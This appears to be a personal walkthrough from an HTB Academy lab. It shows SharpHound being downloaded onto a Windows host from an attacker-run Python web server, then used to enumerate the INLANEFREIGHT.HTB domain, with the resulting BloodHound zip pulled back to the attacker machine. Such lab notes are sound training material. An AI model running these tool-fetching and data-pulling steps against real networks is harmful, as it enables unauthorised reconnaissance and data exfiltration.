# RDP into Windows Server

# File Transfer
### Python Web Server
```
~/Tools > ls
Bloodhound            SharpHound.exe.config  System.Diagnostics.Tracing.dll
hacktricks            SharpHound.pdb         System.Net.Http.dll
HTB_Academy2md        SharpHound.ps1         Tools-of-the-trade.txt
PayloadsAllTheThings  sharphound.zip         Tools-of-the-trade.zip
SharpHound.exe        System.Console.dll
~/Tools > python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
### Invoke Web Request (IWR)
```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\htb-student> Invoke-WebRequest "http://10.10.14.2:8000/SharpHound.exe" -OutFile "sharphound.exe"
PS C:\Users\htb-student> ls


    Directory: C:\Users\htb-student


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        1/10/2023   8:57 AM                3D Objects
d-r---        1/10/2023   8:57 AM                Contacts
d-r---        2/25/2023   4:42 AM                Desktop
d-r---        1/11/2023   1:43 PM                Documents
d-r---        1/10/2023   9:00 AM                Downloads
d-r---        1/10/2023   8:57 AM                Favorites
d-r---        1/10/2023   8:57 AM                Links
d-r---        1/10/2023   8:57 AM                Music
d-r---        1/10/2023   8:57 AM                Pictures
d-r---        1/10/2023   8:57 AM                Saved Games
d-r---        1/10/2023   8:57 AM                Searches
d-r---        1/10/2023   8:57 AM                Videos
-a----        11/7/2023   4:06 PM        1114624 sharphound.exe


PS C:\Users\htb-student>
```
# Running SharpHound.exe
```
PS C:\Users\htb-student> .\sharphound.exe
2023-11-07T16:07:15.6598178-06:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2023-11-07T16:07:15.8316719-06:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-11-07T16:07:15.8785513-06:00|INFORMATION|Initializing SharpHound at 4:07 PM on 11/7/2023
2023-11-07T16:07:16.0660653-06:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for INLANEFREIGHT.HTB : DC01.INLANEFREIGHT.HTB
2023-11-07T16:08:04.3941723-06:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-11-07T16:08:04.6442114-06:00|INFORMATION|Beginning LDAP search for Sharphound.EnumerationDomain
2023-11-07T16:08:04.6442114-06:00|INFORMATION|Testing ldap connection to INLANEFREIGHT.HTB
2023-11-07T16:08:04.7223094-06:00|INFORMATION|Producer has finished, closing LDAP channel
2023-11-07T16:08:04.7379205-06:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-11-07T16:08:35.4879451-06:00|INFORMATION|Status: 1 objects finished (+1 0.03333334)/s -- Using 35 MB RAM
2023-11-07T16:09:05.5043199-06:00|INFORMATION|Status: 1 objects finished (+0 0.01666667)/s -- Using 36 MB RAM
2023-11-07T16:09:35.5191860-06:00|INFORMATION|Status: 83 objects finished (+82 0.9222222)/s -- Using 41 MB RAM
2023-11-07T16:09:35.5504424-06:00|INFORMATION|Consumers finished, closing output channel
2023-11-07T16:09:35.6598142-06:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-11-07T16:09:35.8317039-06:00|INFORMATION|Status: 163 objects finished (+80 1.791209)/s -- Using 41 MB RAM
2023-11-07T16:09:35.8317039-06:00|INFORMATION|Enumeration finished in 00:01:31.1955460
2023-11-07T16:09:35.9567098-06:00|INFORMATION|Saving cache with stats: 101 ID to type mappings.
 105 name to SID mappings.
 2 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-11-07T16:09:36.0035785-06:00|INFORMATION|SharpHound Enumeration Completed at 4:09 PM on 11/7/2023! Happy Graphing!
PS C:\Users\htb-student>
```
# Transfer files back over to linux machine
```
PS C:\Users\htb-student> python -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
::ffff:10.10.14.2 - - [07/Nov/2023 16:23:39] "GET /20231107160804_BloodHound.zip HTTP/1.1" 200 -
```

```
~/labs/htb_academy/active_directory_bloodhound > wget 10.129.204.228:8000/20231107160804_BloodHound.zip                                                                                INT 1m 45s
--2023-11-07 14:23:38--  http://10.129.204.228:8000/20231107160804_BloodHound.zip
Connecting to 10.129.204.228:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16760 (16K) [application/x-zip-compressed]
Saving to: ‘20231107160804_BloodHound.zip’

20231107160804_BloodHound.zip                    100%[========================================================================================================>]  16.37K  --.-KB/s    in 0.08s   

2023-11-07 14:24:08 (209 KB/s) - ‘20231107160804_BloodHound.zip’ saved [16760/16760]

~/labs/htb_academy/active_directory_bloodhound > ls                                                                                                                                           31s
20231107160804_BloodHound.zip
```

